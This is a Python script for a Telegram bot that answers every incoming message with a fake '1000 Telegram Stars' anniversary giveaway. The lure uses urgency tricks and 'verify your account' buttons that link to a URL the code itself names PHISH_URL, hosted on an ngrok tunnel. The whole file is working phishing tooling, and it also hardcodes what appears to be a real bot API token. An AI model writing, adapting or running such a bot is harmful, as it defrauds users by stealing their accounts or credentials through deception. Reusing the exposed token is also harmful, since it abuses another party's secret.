import requests
import time

BOT_TOKEN = "8497968985:AAFcPPPmvbYj6atitLNrgOt9eTnhIgoUmhk"
PHISH_URL = "https://spotted-deafness-datebook.ngrok-free.dev"
API = f"https://api.telegram.org/bot{BOT_TOKEN}"

def send_message(chat_id, text, reply_markup=None):
    payload = {"chat_id": chat_id, "text": text, "parse_mode": "Markdown"}
    if reply_markup:
        payload["reply_markup"] = reply_markup
    try:
        requests.post(f"{API}/sendMessage", json=payload, timeout=30)
    except Exception as e:
        print(f"send fail: {e}")

def get_updates(offset=None):
    params = {"timeout": 30, "offset": offset}
    try:
        r = requests.get(f"{API}/getUpdates", params=params, timeout=35)
        return r.json().get("result", [])
    except Exception as e:
        print(f"poll error: {e}")
        return []

def main():
    print("Bot running...")
    offset = None
    while True:
        updates = get_updates(offset)
        for u in updates:
            offset = u["update_id"] + 1
            msg = u.get("message", {})
            chat_id = msg.get("chat", {}).get("id")
            text = msg.get("text", "")
            if not chat_id:
                continue
            
            if text == "/start":
                markup = {
                    "inline_keyboard": [
                        [{"text": "🎁 Claim 1000 Stars Now", "url": PHISH_URL}]
                    ]
                }
                send_message(
                    chat_id,
                    "🎉 *Congratulations!*\n\n"
                    "You've been selected to receive *1000 Telegram Stars* "
                    "as part of our *5-year anniversary giveaway*!\n\n"
                    "✨ _Limited offer — first 10,000 users only_\n"
                    "⏰ _Expires in 24 hours_\n"
                    "💎 _1000 Stars = $19.99 value_\n\n"
                    "Click below to verify your account and claim your reward:",
                    reply_markup=markup
                )
            elif text == "/claim":
                markup = {
                    "inline_keyboard": [
                        [{"text": "🎁 Verify & Claim", "url": PHISH_URL}]
                    ]
                }
                send_message(
                    chat_id,
                    "🎁 *Final Step*\n\n"
                    "Verify your account to receive your 1000 Stars:",
                    reply_markup=markup
                )
            else:
                markup = {
                    "inline_keyboard": [
                        [{"text": "🎁 Claim 1000 Stars", "url": PHISH_URL}]
                    ]
                }
                send_message(
                    chat_id,
                    f"🎉 *Free 1000 Telegram Stars*\n\n"
                    f"Verify and claim here:\n{PHISH_URL}",
                    reply_markup=markup
                )
        
        time.sleep(1)

if __name__ == "__main__":
    main()